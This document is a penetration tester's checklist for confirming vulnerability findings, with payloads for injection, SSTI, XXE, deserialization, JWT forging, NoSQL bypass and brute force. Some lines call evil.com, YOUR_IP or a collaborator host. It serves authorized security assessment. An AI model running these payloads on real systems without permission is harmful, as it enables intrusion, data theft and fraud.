# Verification Checklist — True Positive Confirmation

Every finding must pass this checklist before inclusion in the report.

---

## Universal Rules

1. **Test live.** No finding is confirmed without an active HTTP response proving it.
2. **Compare against a baseline.** Always test a known-negative to distinguish real from generic.
3. **Record exact evidence.** HTTP code + response size + relevant body snippet.
4. **Assign status.** ✅ TRUE POSITIVE / ❌ FALSE POSITIVE / ⚠️ CONDITIONAL.

---

## Finding-Specific Checks

### Git Directory Exposure
```bash
# Claim: /.git/ returns HTTP 403 → directory exists
# Test: Also request a completely random dot-path
curl -sk -o /dev/null -w "%{http_code} %{size_download}" "http://TARGET/.git/HEAD"
curl -sk -o /dev/null -w "%{http_code} %{size_download}" "http://TARGET/.nonexistent123/x"

# If both return 403 + same size → Apache generic dot-path block = FALSE POSITIVE
# If /.git/ returns 403 + 26B and /.random/ returns 404 = TRUE POSITIVE
```

### Username Enumeration via Password Reset
```bash
# Claim: Form reflects username → valid users identifiable
curl -sk -X POST "http://TARGET/reset" -d "username=admin" | grep -i 'admin\|not found\|success'
curl -sk -X POST "http://TARGET/reset" -d "username=doesnotexist999" | grep -i 'doesnotexist\|not found\|success'

# If responses differ (message OR content) = TRUE POSITIVE
# If responses identical = FALSE POSITIVE
```

### SQL Injection
```bash
# Boolean test (should change response if injectable)
curl -sk "http://TARGET/page?id=1" -o a.txt
curl -sk "http://TARGET/page?id=1 AND 1=1" -o b.txt  # should == a
curl -sk "http://TARGET/page?id=1 AND 1=2" -o c.txt  # should differ from a

# Time-based (only if no other indicator)
START=$(date +%s%N)
curl -sk "http://TARGET/page?id=1 AND SLEEP(5)--"
END=$(date +%s%N)
echo "Elapsed: $(( (END-START)/1000000 ))ms"
# > 5000ms = likely vulnerable; bcrypt/constant-time may mask timing
```

### XSS
```bash
# Step 1: Does the payload appear in response?
curl -sk "http://TARGET/page?q=XSSTEST123" | grep 'XSSTEST123'

# Step 2: Is it inside an executable context?
curl -sk "http://TARGET/page?q=XSSTEST123" | grep -B2 -A2 'XSSTEST123'
# In <script>: dangerous; in HTML-escaped context: likely safe

# Step 3: Can we close tag and inject?
curl -sk "http://TARGET/page?q=</title><script>alert(1)</script>" | grep -i 'alert(1)'
```

### Open Redirect
```bash
# If redirect is server-side:
curl -sk -I "http://TARGET/redirect?url=https://evil.com" | grep -i 'location:'

# If redirect is JavaScript (client-side):
curl -sk "http://TARGET/page?desturl=@evil.com" | grep -o 'window.location.href.*'
# Confirm: does the JS concat the desturl without validation?
# PoC value: @evil.com or //evil.com or /\evil.com
```

### Path Traversal / File Exposure
```bash
# Confirm file exists AND has content
curl -sk "http://TARGET/core/config/config.inc.php" \
  -w "\nHTTP: %{http_code} | Size: %{size_download}B"

# If HTTP 200 + 0B → PHP interprets file, no content exposed = NOT critical
# If HTTP 200 + >0B → file served as-is → credentials readable = CRITICAL
# If HTTP 403 → blocked = NOT VULNERABLE
# If HTTP 404 → does not exist = FALSE POSITIVE
```

### No Account Lockout
```bash
python3 - <<'EOF'
import urllib.request, urllib.parse, time

url = "http://TARGET/connectors/index.php"
headers = {"Host": "HOSTNAME", "Content-Type": "application/x-www-form-urlencoded"}

for i in range(1, 51):
    data = urllib.parse.urlencode({
        "action": "security/login",
        "username": "admin",
        "password": f"wrongpass{i}"
    }).encode()
    req = urllib.request.Request(url, data=data, headers=headers)
    r = urllib.request.urlopen(req)
    body = r.read().decode()
    if i % 10 == 0:
        locked = "lockout" in body.lower() or "blocked" in body.lower()
        print(f"Attempt {i}: locked={locked} | {body[:60]}")
EOF
# All 50 = success:false, no lockout message → TRUE POSITIVE (no lockout)
```

### Missing Security Headers
```bash
curl -sI "http://TARGET/" -H "Host: HOSTNAME" \
  | grep -iE 'x-frame-options|content-security-policy|x-content-type-options|strict-transport-security|referrer-policy|permissions-policy'

# If grep returns nothing → all missing = TRUE POSITIVE
# Document which are missing, which are present
```

### Session Cookie Flags
```bash
curl -sI "http://TARGET/login" | grep -i 'set-cookie'
# Check: Secure flag, HttpOnly flag, SameSite=Strict or Lax
# Missing any → flag in report with appropriate severity
```

### WebDAV Write Access
```bash
# Step 1: Confirm methods available
curl -sk -X OPTIONS "https://webdisk.TARGET/" \
  -w "Allow: %header{allow} | DAV: %header{dav}\n" -o /dev/null

# Step 2: Confirm auth is required (not openly writable)
curl -sk -X PUT "https://webdisk.TARGET/test.txt" \
  --data "probe" -w "HTTP: %{http_code}" -o /dev/null
# HTTP 401 → auth required (medium risk, not critical)
# HTTP 200/201 → no auth → CRITICAL, remove file immediately

# Step 3: Brute-force (optional)
# Only if scope permits credential testing
```

### CORS Misconfiguration
```bash
curl -sk -I "http://TARGET/api/" \
  -H "Host: HOSTNAME" \
  -H "Origin: https://evil.com" \
  | grep -i 'access-control-allow-origin\|access-control-allow-credentials'

# Vulnerable: ACAO = * (with ACAC = true → browser blocks, but still bad)
# Vulnerable: ACAO = https://evil.com (reflects arbitrary origin)
# Safe: ACAO absent or ACAO = https://actual.origin.com
```

---

## Evidence Template

For each finding, record:

```
Finding: F-XX — [title]
Command: [exact curl/tool command]
Response: HTTP [code] | Size: [N]B | Body: "[first 100 chars]"
Baseline: HTTP [code] | Size: [N]B (for comparison)
Status: ✅ TRUE POSITIVE / ❌ FALSE POSITIVE / ⚠️ CONDITIONAL
Reason: [one sentence explaining the determination]
```

---

## SSTI Verification

```bash
# Confirm math expression evaluates server-side
curl -sk "http://IP/page?param={{7*7}}" | grep '49'      # Jinja2/Twig
curl -sk "http://IP/page?param=${7*7}" | grep '49'       # Spring/Freemarker
curl -sk "http://IP/page?param=#{7*7}" | grep '49'       # Ruby ERB / Pebble

# Confirm it's not client-side (would only evaluate in browser JS, not curl)
# If grep returns 49 via curl → server-side = TRUE POSITIVE
# If grep returns nothing via curl → might be client-side = test in browser first
```

---

## Command Injection Verification

```bash
# Time-based (no output required)
TIME_SAFE=$(curl -sk "http://IP/page?param=safe" -w "%{time_total}" -o /dev/null)
TIME_SLEEP=$(curl -sk "http://IP/page?param=safe;sleep+5" -w "%{time_total}" -o /dev/null)
echo "Safe: ${TIME_SAFE}s | Sleep: ${TIME_SLEEP}s"
# >5s difference = TRUE POSITIVE

# Output-based (DNS/HTTP out-of-band — more reliable)
# Use Burp Collaborator or interactsh:
# curl -sk "http://IP/page?param=;nslookup+COLLABORATOR.URL"
# If DNS query received = TRUE POSITIVE

# In-band output
curl -sk "http://IP/page?param=;id" | grep 'uid='
# uid=33(www-data) = TRUE POSITIVE
```

---

## File Upload Verification

```bash
# After upload, find the stored URL from the response
STORED_URL=$(curl -sk -X POST "http://IP/upload" -F "file=@/tmp/test.php" \
  -H "Host: HOSTNAME" | grep -oP 'https?://[^"<\s]+\.php')

# Attempt execution
curl -sk "$STORED_URL?c=id" | grep uid
# uid returned = CRITICAL — PHP execution confirmed

# If no direct URL in response, try predictable paths
for PATH in "/uploads/" "/files/" "/media/" "/assets/uploads/" "/public/files/"; do
  curl -sk -o /dev/null -w "%{http_code}" "http://IP${PATH}test.php" -H "Host: HOSTNAME"
done
```

---

## XXE Verification

```bash
# Confirm external entity is fetched (OOB)
# 1. Start a listener: python3 -m http.server 9999
# 2. Send XXE payload pointing to your IP
curl -sk -X POST "http://IP/api/xml" -H "Host: HOSTNAME" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_IP:9999/xxe_probe">]>
<root>&xxe;</root>'
# If your listener receives a GET /xxe_probe = TRUE POSITIVE (SSRF/XXE confirmed)

# In-band: /etc/passwd should appear in response body
curl -sk -X POST "http://IP/api/xml" -H "Host: HOSTNAME" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>' | grep 'root:'
```

---

## JWT Verification

```bash
# Decode without verification — check claim values
JWT="TOKEN_FROM_APP"
echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Test alg=none: craft token, send to protected endpoint
curl -sk "http://IP/api/admin" -H "Host: HOSTNAME" \
  -H "Authorization: Bearer ALG_NONE_TOKEN" | grep -i 'admin\|user\|profile'
# 200 with data = TRUE POSITIVE (signature not verified)

# Test weak secret: try with hashcat result as secret
python3 -c "
import jwt  # pip install PyJWT
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, 'CRACKED_SECRET', algorithm='HS256')
print(token)
"
curl -sk "http://IP/api/admin" -H "Authorization: Bearer NEW_TOKEN" -H "Host: HOSTNAME"
```

---

## Race Condition Verification

```bash
# Confirm by checking state after parallel requests
# 1. Record balance/count BEFORE
BEFORE=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oP '\d+')

# 2. Send 20 parallel redemptions
seq 1 20 | xargs -P 20 -I{} curl -sk -X POST "http://IP/redeem" \
  -b "session=VALID" -d "coupon=SAVE50" -H "Host: HOSTNAME" -o /dev/null

# 3. Record balance AFTER
AFTER=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oP '\d+')

echo "Before: $BEFORE | After: $AFTER"
# If AFTER shows discount applied multiple times = TRUE POSITIVE
```

---

## Business Logic Verification

```bash
# Price manipulation: confirm the server accepts and uses the tampered price
curl -sk -X POST "http://IP/checkout" -b "session=VALID" -H "Host: HOSTNAME" \
  -d "product_id=1&quantity=1&price=0.01" | grep -i 'total\|order\|confirmation'
# "Total: $0.01" or order confirmed at modified price = TRUE POSITIVE

# Mass assignment: confirm extra fields are reflected/applied
curl -sk "http://IP/api/profile" -b "session=VALID" -H "Host: HOSTNAME" | grep -i 'role\|admin'
# If role shows "admin" after sending {"role":"admin"} = TRUE POSITIVE
```

---

## Deserialization Verification

```bash
# Time-based (no output required — sleep in payload)
java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64 -w0 > /tmp/sleep_payload.b64
START=$(date +%s)
curl -sk -X POST "http://IP/api" -H "Host: HOSTNAME" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @<(base64 -d /tmp/sleep_payload.b64) -o /dev/null
END=$(date +%s)
echo "Elapsed: $((END-START))s"
# ≥5s = TRUE POSITIVE

# OOB: DNS callback in payload
java -jar ysoserial.jar CommonsCollections6 'nslookup COLLABORATOR.URL' | base64 -w0 > /tmp/dns_payload.b64
curl -sk -X POST "http://IP/api" --data-binary @<(base64 -d /tmp/dns_payload.b64) -H "Host: HOSTNAME"
# DNS query on collaborator = TRUE POSITIVE
```

---

## CORS Verification (Requires Credentials)

```bash
# True CORS misconfiguration = BOTH conditions must hold:
# 1. ACAO reflects your origin (or is *)
# 2. ACAC = true (required for credential-bearing requests to be exploitable)

curl -sk "http://IP/api/data" -H "Host: HOSTNAME" \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID_SESSION_COOKIE" \
  -w "\nACAO: %header{access-control-allow-origin}\nACAC: %header{access-control-allow-credentials}\n" \
  -o response.json

# Check response body contains sensitive data
cat response.json | python3 -m json.tool | grep -i 'email\|token\|user\|id'

# All of these together = TRUE POSITIVE:
# - ACAO = https://evil.com (or *)
# - ACAC = true
# - Response body contains sensitive data
# - Session cookie included = attacker can exfiltrate data cross-origin
```

---

## NoSQL Injection Verification

```bash
# Confirm authentication bypass
curl -sk -X POST "http://IP/api/login" -H "Host: HOSTNAME" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}' | python3 -m json.tool

# If response contains token/user data without valid credentials = TRUE POSITIVE

# Confirm with negative test (invalid operator should fail)
curl -sk -X POST "http://IP/api/login" -H "Host: HOSTNAME" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$lt":""},"password":{"$lt":""}}' | grep -i 'error\|false\|invalid'
# Different response from positive = operator injection confirmed
```

---

## Clickjacking Verification

```bash
# Check headers
curl -sI "http://IP/" -H "Host: HOSTNAME" | grep -i 'x-frame-options\|frame-ancestors'
# If absent: test in browser with this PoC

# HTML PoC
cat << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>Clickjacking PoC</h1>
<style>
  iframe { opacity: 0.5; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
  button { position: absolute; top: 200px; left: 200px; z-index: 10; }
</style>
<iframe src="http://TARGET/sensitive-action"></iframe>
<button>Click here to win!</button>
</body>
</html>
EOF
# If iframe loads target page = TRUE POSITIVE
# Save PoC as pentest/poc/clickjacking.html and serve: python3 -m http.server 8888
```

---

## GraphQL Introspection Verification

```bash
# Confirm schema is exposed
curl -sk -X POST "http://IP/graphql" -H "Host: HOSTNAME" \
  -H "Content-Type: application/json" \
  --data '{"query":"{ __typename }"}' | grep '__typename'
# Response = {"data":{"__typename":"Query"}} = GraphQL endpoint confirmed

# Confirm introspection enabled
curl -sk -X POST "http://IP/graphql" -H "Host: HOSTNAME" \
  -H "Content-Type: application/json" \
  --data '{"query":"{ __schema { types { name } } }"}' | grep '"name"' | wc -l
# > 5 type names = introspection enabled = TRUE POSITIVE
```
